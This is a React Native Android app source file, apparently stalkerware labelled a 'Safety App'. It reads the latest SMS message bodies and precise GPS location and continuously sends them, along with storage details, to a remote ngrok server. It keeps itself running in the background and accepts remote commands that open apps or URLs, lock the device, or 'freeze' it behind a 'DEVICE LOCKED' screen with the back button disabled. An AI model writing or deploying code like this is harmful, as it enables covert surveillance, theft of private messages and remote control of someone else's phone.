/**
 * Tracker App - Final Integrated Version
 */

import React, { useEffect, useState, useRef } from 'react';
import { 
  StatusBar, 
  StyleSheet, 
  View, 
  Text, 
  Alert, 
  PermissionsAndroid, 
  Platform, 
  Linking, 
  NativeModules, 
  BackHandler, 
  TouchableOpacity 
} from 'react-native';
import Geolocation from 'react-native-geolocation-service';
import DeviceInfo from 'react-native-device-info';
import io from 'socket.io-client';
import SmsAndroid from 'react-native-get-sms-android';
import BackgroundService from 'react-native-background-actions';
import SendIntentAndroid from 'react-native-send-intent';

const { LockModule } = NativeModules;
const SERVER_URL = 'https://subopaquely-podophyllic-nicola.ngrok-free.dev'; // Public ngrok URL

// Background task options
const options = {
  taskName: 'TrackerBackground',
  taskTitle: 'Tracker App Running',
  taskDesc: 'Maintaining connection to server',
  taskIcon: { name: 'ic_launcher', type: 'mipmap' },
  color: '#ff00ff',
  linkingURI: 'trackerapp://chat',
  parameters: { delay: 1000 },
};

// Background task function
const backgroundTask = async (taskDataArguments: any) => {
  const { delay } = taskDataArguments;
  await new Promise<void>(async (resolve) => {
    for (let i = 0; BackgroundService.isRunning(); i++) {
      await BackgroundService.updateNotification({ taskDesc: `Security active for ${i} seconds` });
      await new Promise<void>((res) => setTimeout(() => res(), delay));
    }
  });
};

function App() {
  const [deviceId, setDeviceId] = useState('');
  const [location, setLocation] = useState({ lat: 0, lon: 0 });
  const [sms, setSms] = useState<string[]>([]);
  const [storage, setStorage] = useState({ total: 0, free: 0 });
  const [watchId, setWatchId] = useState<number | null>(null);
  const [socketConnected, setSocketConnected] = useState(false);
  const [isFrozen, setIsFrozen] = useState(false);
  const socketRef = useRef<any>(null);

  const isFrozenRef = useRef(false);

  useEffect(() => {
    isFrozenRef.current = isFrozen;
  }, [isFrozen]);

  useEffect(() => {
    const backHandler = BackHandler.addEventListener('hardwareBackPress', () => {
      return isFrozenRef.current; // Blocks back button if frozen
    });
    return () => backHandler.remove();
  }, []);

  const reconnect = () => {
    if (socketRef.current && socketRef.current.disconnected) {
      socketRef.current.connect();
    }
  };

  useEffect(() => {
    const init = async () => {
      const id = await DeviceInfo.getUniqueId();
      setDeviceId(id);

      if (Platform.OS === 'android') {
        await requestPermissions();
      }

      console.log('=== ATTEMPTING CONNECTION ===');
      
      const socket = io(SERVER_URL, {
        reconnection: true,
        reconnectionAttempts: Infinity,
        reconnectionDelay: 1000,
        timeout: 20000,
        transports: ['websocket'], // Crucial for ngrok stability
        extraHeaders: {
          "ngrok-skip-browser-warning": "true" // Bypasses ngrok landing page
        }    
      });
      socketRef.current = socket;

      socket.on('connect', () => {
        console.log('=== CONNECTED ===');
        setSocketConnected(true);
        socket.emit('register', id);
        
        // Immediate data push so dashboard isn't empty on load
        socket.emit('data', {
          deviceId: id, 
          location: { lat: 0, lon: 0 }, 
          sms: [], 
          storage: { total: 0, free: 0 } 
        });
      });

      socket.on('connect_error', (err) => {
        console.log('Socket Error:', err.message);
        setSocketConnected(false);
      });

      socket.on('disconnect', () => setSocketConnected(false));

      socket.on('command', (data) => {
        try {
          if (data.deviceId === id) {
            const command = data.command.toLowerCase().trim();
            
            if (command.startsWith('open ')) {
              const target = command.substring(5);
              switch (target) {
                case 'youtube':
                  SendIntentAndroid.openApp('com.google.android.youtube', {}).then(res => { if(!res) Linking.openURL('vnd.youtube://'); });
                  break;
                case 'camera':
                  SendIntentAndroid.openCamera();
                  break;
                case 'lock':
                  NativeModules.LockModule.lockScreen().catch(() => Alert.alert('Error', 'Enable Admin first'));
                  break;
                case 'freeze':
                  setIsFrozen(true);
                  NativeModules.LockModule.isDeviceOwner().then(() => {
                    NativeModules.LockModule.startPinning().catch((e: any) => console.log(e));
                  });
                  break;
                case 'unfreeze':
                  setIsFrozen(false);
                  NativeModules.LockModule.stopPinning().catch((e:any) => console.log(e));
                  break;
                default:
                  SendIntentAndroid.openApp(target, {}).then(res => {
                    if(!res) SendIntentAndroid.openAppWithUri(target, {});
                  });
              }
            } else if (command.startsWith('http')) {
              Linking.openURL(command);
            }
          }
        } catch (error) {
          console.error('Command handling error:', error);
        }
      });

      // Start continuous location watching and data collection
      startLocationTracking(id, socket);

      // Start background service to keep app alive
      try {
        await BackgroundService.start(backgroundTask, options);
      } catch (error) {
        console.error('BG Service Error:', error);
      }
    };

    init();

    return () => {
      if (watchId !== null) Geolocation.clearWatch(watchId);
      BackgroundService.stop();
    };
  }, []); // Empty array = Runs only once

  const requestPermissions = async () => {
    try {
      const permissions = [
        PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
        PermissionsAndroid.PERMISSIONS.READ_SMS,
        PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
      ];
      if (Number(Platform.Version) >= 33) {
        permissions.push(PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS);
      }
      await PermissionsAndroid.requestMultiple(permissions);
    } catch (err) {
      console.warn(err);
    }
  };

  const startLocationTracking = (id: string, socket: any) => {
    const watch = Geolocation.watchPosition(
      (position) => {
        const newLocation = { lat: position.coords.latitude, lon: position.coords.longitude };
        setLocation(newLocation);

        SmsAndroid.list(JSON.stringify({}), (f) => {}, (count, smsList) => {
          const smsArray = JSON.parse(smsList);
          const newSms = smsArray.slice(0, 5).map((s: any) => s.body);
          setSms(newSms);

          DeviceInfo.getTotalDiskCapacity().then((total) => {
            DeviceInfo.getFreeDiskStorage().then((free) => {
              socket.emit('data', { deviceId: id, location: newLocation, sms: newSms, storage: { total, free } });
            });
          });
        });
      },
      (error) => console.error(error),
      { enableHighAccuracy: true, distanceFilter: 10, interval: 10000 }
    );

    setWatchId(watch);
  };

  const handleRemoveAdmin = () => {
    Alert.alert(
      "Warning",
      "This will remove the Device Owner status. Only do this to uninstall the app.",
      [
        { text: "Cancel", style: "cancel" },
        { text: "Remove", style: "destructive", onPress: () => {
          NativeModules.LockModule.removeDeviceOwner()
            .then((res: string) => Alert.alert("Success", res))
            .catch((err: any) => Alert.alert("Error", "Rebuild app or check LockModule.kt"));
        }}
      ]
    );
  };

  if (isFrozen) {
    return (
      <View style={[styles.container, { backgroundColor: '#cc0000' }]}>
        <StatusBar hidden={true} />
        <Text style={styles.frozenText}>DEVICE LOCKED</Text>
        <Text style={styles.frozenSubText}>Contact Administrator</Text>
      </View>
    );
  }

  return (
    <View style={styles.container}>
      <Text style={styles.title}>Safety App Running</Text>
      <View style={styles.infoCard}>
        <Text>ID: {deviceId}</Text>
        <Text>Status: {socketConnected ? '🟢 Online' : '🔴 Offline'}</Text>
      </View>

      <TouchableOpacity style={styles.button} onPress={reconnect}>
        <Text style={styles.buttonText}>Reconnect Server</Text>
      </TouchableOpacity>

      <TouchableOpacity style={styles.button} onPress={() => NativeModules.LockModule.enableAdmin()}>
        <Text style={styles.buttonText}>Activate Admin (Lock)</Text>
      </TouchableOpacity>

      <TouchableOpacity style={styles.removeBtn} onPress={handleRemoveAdmin}>
        <Text style={{color: 'white', fontWeight: 'bold'}}>REMOVE ADMIN STATUS</Text>
      </TouchableOpacity>

      <Text style={styles.coords}>
        Location: {location.lat.toFixed(4)}, {location.lon.toFixed(4)}
      </Text>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, justifyContent: 'center', alignItems: 'center', backgroundColor: '#f0f0f0', padding: 20 },
  title: { fontSize: 24, fontWeight: 'bold', marginBottom: 20 },
  infoCard: { backgroundColor: 'white', padding: 15, borderRadius: 10, width: '100%', marginBottom: 20, elevation: 2 },
  button: { backgroundColor: '#e0e0e0', padding: 15, borderRadius: 8, width: '100%', alignItems: 'center', marginBottom: 10 },
  buttonText: { fontSize: 16, color: '#333' },
  removeBtn: { backgroundColor: '#ff4444', padding: 15, borderRadius: 8, width: '100%', alignItems: 'center', marginTop: 40 },
  coords: { marginTop: 20, color: '#666' },
  frozenText: { color: 'white', fontSize: 32, fontWeight: 'bold' },
  frozenSubText: { color: 'white', fontSize: 18, marginTop: 20 },
});

export default App;
